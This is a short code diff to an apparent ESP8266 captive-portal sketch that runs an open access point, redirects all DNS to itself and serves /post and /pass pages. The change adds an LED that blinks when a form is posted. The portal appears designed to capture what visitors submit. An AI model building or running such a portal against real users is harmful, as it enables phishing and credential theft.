@@ -69,6 +69,17 @@ String posted() {
   return header(POST_TITLE) + POST_BODY + footer();
 }
 
+void BLINK() { // The internal LED will blink 5 times.
+  int count = 0;
+  while(count < 5){
+    digitalWrite(BUILTIN_LED, LOW);
+    delay(350);
+    digitalWrite(BUILTIN_LED, HIGH);
+    delay(350);
+    count = count + 1;
+  }
+}
+
 void setup() {
   
   bootTime = lastActivity = millis();
@@ -76,10 +87,12 @@ void setup() {
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(SSID_NAME);
   dnsServer.start(DNS_PORT, "*", APIP);
-  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); });
+  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
   webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
   webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
   webServer.begin();
+  pinMode(BUILTIN_LED, OUTPUT);
+  digitalWrite(BUILTIN_LED, HIGH);
 }
 
 
